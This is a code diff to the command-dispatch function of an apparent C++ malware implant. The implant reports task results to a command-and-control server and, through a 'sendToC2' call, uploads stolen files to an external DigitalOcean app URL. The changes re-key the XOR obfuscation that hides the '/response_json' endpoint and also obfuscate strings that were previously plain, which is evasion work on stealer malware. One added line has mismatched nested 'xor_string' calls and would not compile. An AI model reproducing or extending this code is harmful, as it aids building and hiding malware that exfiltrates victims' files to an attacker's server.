@@ -21,11 +21,11 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             // persist_execution(getUserName());
         }
         catch(...){
-            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, xor_string("NIADML",0x28), xor_string("NIAD]ZM",0x28), command);
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, xor_string("NIADML",0x28), xor_string("NIAD]ZM",0x28), command);
             work = xor_string("fG",0x28);
         }
         if(work.compare(xor_string("fG",0x28)) == 1){
-            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, xor_string("MPMK]\\ML",0x28), xor_string("[]KKM[[",0x28), command);
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, xor_string("MPMK]\\ML",0x28), xor_string("[]KKM[[",0x28), command);
         }
         
     }
@@ -54,11 +54,11 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
         }
         catch(...){
-            StealerHttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            StealerHttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
             work = xor_string("fG",0x28);
         }
         if(work.compare(xor_string("fG",0x28)) == 1){
-            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
+            HttpResponse(xor_string(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
         }
 
     }
@@ -77,11 +77,11 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             std::replace( results.begin(), results.end(), '-', '_');
         }
         catch(...){
-            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
             work = xor_string("fG",0x28);
         }
         if(work.compare(xor_string("fG",0x28)) == 1){
-            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
         }
     }
     
@@ -99,11 +99,11 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             std::replace( results.begin(), results.end(), '-', '_');
         }
         catch(...){
-            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
             work = xor_string("fG",0x28);
         }
         if(work.compare(xor_string("fG",0x28)) == 1){
-            HttpResponse(xor_string("tZM[XGF[MwB[GF",0x28), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("[]KKM[[",0x28), command);
         }
     }
    
@@ -146,11 +146,11 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             sendToC2(path,"https://sea-lion-app-f5nrq.ondigitalocean.app/upload_files", filename, std::to_string(task_id));
         }
         catch(...){
-            HttpResponse("/response_json", implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
             work = xor_string("fG",0x28);
         }
         if(work.compare(xor_string("fG",0x28)) == 1){
-            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, "success", command);
         }
     }
     return;
